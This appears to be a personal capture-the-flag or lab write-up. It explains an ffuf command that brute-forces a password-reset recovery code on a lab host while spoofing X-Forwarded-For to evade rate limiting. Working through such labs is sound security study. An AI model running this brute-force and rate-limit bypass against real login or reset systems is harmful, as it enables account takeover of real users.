According to the Walkthrough, we should use "Ffuf" again.

ffuf -w numbers.txt -u "http://10.145.148.198:1337/reset_password.php" -X "POST" -d "recovery_code=FUZZ&s=60" -H "Cookie: PHPSESSID=3u2ms637t9s7t7nr8p3u220u1k" 
-H "X-Forwarded-For: FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid" -s

What does this do?

-d "recovery_code=FUZZ&s=60": This is the POST data. The value "FUZZ" will be replaced with each entry from the wordlist.

-H "Cookie: PHPSESSID=3u2ms637t9s7t7nr8p3u220u1k": This adds a session cookie to the request, to stay logged in.

-H "X-Forwarded-For: FUZZ": This sets the "X-Forwarded-For" header, and uses FUZZ again. This is often done to bypass rate limiting by spoofing the client IP address.

-H "Content-Type: application/x-www-form-urlencoded": Sets the content type to form data, which is required for POST requests with form fields.

-fr "Invalid": This tells ffuf to filter out any responses that contain the word "Invalid". Only responses that do not contain this word will be shown.

-s: Silent mode. It hides unnecessary output and only shows the results.


